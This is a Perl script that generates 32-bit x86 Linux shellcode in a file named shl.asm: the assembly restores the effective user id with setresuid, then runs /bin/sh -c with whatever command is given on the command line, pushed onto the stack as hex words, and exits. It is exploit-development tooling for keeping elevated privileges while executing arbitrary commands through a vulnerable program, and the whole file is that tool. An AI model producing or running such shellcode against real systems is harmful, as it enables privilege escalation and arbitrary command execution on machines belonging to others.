#!/usr/bin/env perl
use warnings;
use strict;

open FILE, ">shl.asm";

sub packWord {
    my $encodedstr = "";
    foreach (split //, $_[0]) {
        $encodedstr .= unpack "H*", $_;
    }
    return lc($encodedstr);
}

sub makeWords { #not used but I'm still keeping it
    my $word = $_[0];
    while (length $word != 4){
        $word = reverse $word;
        $word .= " ";
        $word = reverse $word;
    }
    return $word;
}

sub makeStr{
    my $fullstr = "";
    foreach my $a (@ARGV){
        $fullstr .= $a . " ";
    }

    chomp($fullstr);
    $fullstr =~ s/\n//g;
    while ((length($fullstr) % 4) != 0){
        $fullstr .= " ";
    }
    $fullstr = reverse $fullstr;
    for (my $i=0; $i<length($fullstr); $i+=4){
        my $sstr = substr $fullstr, $i, 4;
        my $finalStr = "push 0x";
        $finalStr .= packWord($sstr);
        if ($sstr ne "    "){
            print FILE "    " . $finalStr . "\n";
        }
    }
}

sub printHead {
print FILE "bits 32
global _start

section .text
_start:

    ;geteuid()
    xor eax,eax
    mov al, 0x31
    int 0x80

    ;setresuid()
    mov ebx,eax
    mov ecx,eax
    mov edx,eax
    xor eax,eax
    mov al,0xd0
    int 0x80

    xor eax,eax

    ;push /bin//sh
    push eax
    push 0x68732f2f
    push 0x6e69622f

    mov ebx,esp

    ;push -c
    push 0x1111632d
    mov word [esp+2],ax
    mov ecx,esp

    ;push @_[0]
    push eax
";
}

sub printTail {
print FILE "    mov esi,esp
    push eax ;null pointer
    push esi ;user input string pointer
    push ecx ;-c pointer
    push ebx ;/bin/sh
    mov ecx,esp

    ;call me like one of your french girls
    mov edx,eax
    mov al,11
    int 0x80

    ;exit gracefully
    xor eax,eax
    mov ebx,eax
    mov al,1
    int 0x80";
}

printHead(@ARGV);
makeStr();
printTail();
close FILE;


